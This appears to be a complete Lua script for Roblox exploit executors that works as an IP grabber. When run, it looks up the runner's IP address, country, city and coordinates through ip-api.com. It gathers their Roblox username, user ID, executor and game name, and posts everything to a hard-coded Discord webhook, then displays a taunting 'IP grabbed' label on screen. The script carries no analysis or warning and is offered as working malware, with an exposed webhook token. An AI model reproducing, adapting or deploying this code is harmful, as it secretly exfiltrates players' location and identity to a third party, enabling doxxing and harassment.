local final_url = "https://webhook.lewisakura.moe/api/webhooks/1492529869794316438/FTMB5QH68Y0GcFghVGIYCMukbeDacxkqFwpwWP1nynn1ljVzKwafayk1GAlvz2hDkipB"

local http_request = http_request or request or syn.request or http.request or fluxus.request or Krnl.request or http_request 
if not http_request then warn("HTTP 요청 함수를 찾을 수 없습니다!") return end 

local ipData = { query = "알 수 없음", country = "N/A", city = "N/A", lat = "N/A", lon = "N/A", isp = "N/A" }
local success, response = pcall(function() 
    return http_request({ 
        Url = "http://ip-api.com/json/?lang=ko", 
        Method = "GET" 
    }) 
end)

if success and response.Body then
    local decodeSuccess, decoded = pcall(function() return game:GetService("HttpService"):JSONDecode(response.Body) end)
    if decodeSuccess and decoded.status == "success" then 
        ipData = decoded 
    end
end

local playerName = game.Players.LocalPlayer and game.Players.LocalPlayer.Name or "???"
local playerId = game.Players.LocalPlayer and game.Players.LocalPlayer.UserId or 0
local executorName = (identifyexecutor and identifyexecutor()) or "알 수 없음"
local gameName = "알 수 없음"
pcall(function() gameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name end)

local payload = {
    username = "스크립트 IP 로그",
    embeds = {{
        title = "누군가 이 스크립트를 실행했습니다.",
        color = 16711680, -- 빨강
        fields = {
            {name = "IP 주소", value = ipData.query, inline = true},
            {name = "국가", value = ipData.country, inline = true},
            {name = "도시", value = ipData.city, inline = true},
            {name = "위도", value = tostring(ipData.lat), inline = true},
            {name = "경도", value = tostring(ipData.lon), inline = true},
            {name = "닉네임", value = playerName .. " (" .. tostring(playerId) .. ")", inline = false},
            {name = "실행기", value = executorName, inline = true},
            {name = "게임 이름", value = gameName, inline = false},
            {name = "실행 시간", value = os.date("%Y-%m-%d %H:%M:%S KST"), inline = false}
        },
        footer = {text = "IP 로그"}
    }}
}

pcall(function()
    http_request({
        Url = final_url,
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = game:GetService("HttpService"):JSONEncode(payload)
    })
end)

local screenGui = Instance.new("ScreenGui")
local textLabel = Instance.new("TextLabel")

screenGui.Name = "PermanentUI"
screenGui.Parent = game:GetService("CoreGui")
screenGui.IgnoreGuiInset = true

textLabel.Parent = screenGui
textLabel.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
textLabel.BackgroundTransparency = 0.4
textLabel.Position = UDim2.new(0.5, -150, 0.4, 0)
textLabel.Size = UDim2.new(0, 300, 0, 60)
textLabel.Font = Enum.Font.GothamBold
textLabel.Text = "IP 따임"
textLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
textLabel.TextSize = 20
textLabel.TextWrapped = true


